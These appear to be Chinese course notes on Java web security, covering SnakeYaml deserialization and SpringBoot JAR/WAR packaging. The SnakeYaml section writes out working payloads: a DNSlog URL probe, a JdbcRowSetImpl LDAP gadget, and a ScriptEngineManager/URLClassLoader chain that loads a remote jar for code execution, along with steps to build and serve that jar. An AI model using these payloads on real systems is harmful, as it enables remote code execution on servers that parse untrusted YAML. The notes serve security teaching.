# Web开发-JavaEE应用&SpringBoot栈&SnakeYaml反序列化链&JAR&WAR&构建打包

```
常见的创建的序列化和反序列化协议
• （已讲）JAVA内置的writeObject()/readObject()
• JAVA内置的XMLDecoder()/XMLEncoder xml<==>Object
• （已讲）XStream   xml<==>Object
• （已讲）SnakeYaml yaml<==>Object
• （已讲）FastJson  json<==>Object
• Jackson json<==>Object

#SnakeYaml反序列化
SnakeYaml是Java中解析yaml的库，而yaml是一种人类可读的数据序列化语言，通常用于编写配置文件等。
<dependency>
  <groupId>org.yaml</groupId>
  <artifactId>snakeyaml</artifactId>
  <version>1.32</version>
</dependency>
SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化：
Yaml.load()：入参是一个字符串或者一个文件，经过反序列化之后返回一个Java对象；
Yaml.dump()：序列化将一个Java对象转化为yaml文件形式；
测试总结：load和loadas都调用了对应的set方法

参考：https://www.cnblogs.com/F12-blog/p/18151239
1、URL链（自带链）
!!java.net.URL ["http://5dsff0.dnslog.cn/"]: 1

2、!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://localhost:1389/Exploit"
  autoCommit: true

3、RCE（自带链+利用SPI机制）
https://github.com/artsploit/yaml-payload/
javac AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
项目结构-工件-添加-yaml-payload-添加模块输出-构建工件
python -m http.server 9999
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]]]]

#SpringBoot-打包部署-JAR&WAR
参考：https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg
SpringBoot项目打包在各类系统服务器中运行:
①jar类型项目
jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。
②war类型项目
在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。

-Jar打包
报错解决：
https://blog.csdn.net/Mrzhuangr/article/details/124731024
https://blog.csdn.net/wobenqingfeng/article/details/129914639
1、maven-clean-package
2、java -jar xxxxxx.jar

-War打包
1、pom.xml加入或修改：
<packaging>war</packaging>
2、启动类里面加入配置：
public class TestSwaggerDemoApplication extends SpringBootServletInitializer
@Override
protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
	return builder.sources(TestSwaggerDemoApplication.class);
}
3、maven-clean-package
4、war放置tomcat后启动

安全：JAVAEE源码架构
无源码下载泄漏风险，源码泄漏也需反编译

```

